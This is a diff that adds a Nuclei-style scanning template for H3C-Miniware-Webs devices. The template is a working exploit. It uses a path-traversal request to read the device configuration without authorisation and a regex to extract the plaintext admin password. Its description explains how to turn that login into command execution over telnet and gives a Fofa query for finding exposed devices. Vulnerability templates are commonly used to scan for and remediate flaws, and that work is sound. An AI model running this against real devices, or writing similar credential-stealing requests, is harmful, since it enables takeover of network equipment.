@@ -1,0 +1,51 @@
+id: h3c-miniware-web-disclosure
+
+info:
+  name: H3C-Miniware-Webs 设备敏感信息泄露
+  author: SleepingBag945
+  severity: critical
+  description: |
+    配置中有明文的 Web 管理员账号 admin 密码，登录后台可通过开启 telnet 获取命令执行权限。
+    未授权读取密码文件，可获取明文密码（用户名admin，密码：第二个数据包vtypasswd的值）
+    Fofa："userLogin.asp" && server="H3C-Miniware-Webs"
+
+http:
+  - raw:
+      - |
+        GET /userLogin.asp HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /userLogin.asp/../actionpolicy_status/../{{h3cName}}.cfg HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_code_1
+        status:
+          - 200
+      - type: status
+        part: status_code_2
+        status:
+          - 200
+      - type: word
+        part: body_1
+        words:
+          - "H3C Corporation"
+      - type: word
+        part: body_2
+        words:
+          - "vtypasswd="
+
+    extractors:
+      - type: regex
+        name: h3cName
+        internal: true
+        group: 1
+        regex:
+          - "<title>(.*?)系统管理</title>"
+      - type: regex
+        name: vtypasswd
+        group: 1
+        regex:
+          - "vtypasswd=(.*?)\n"
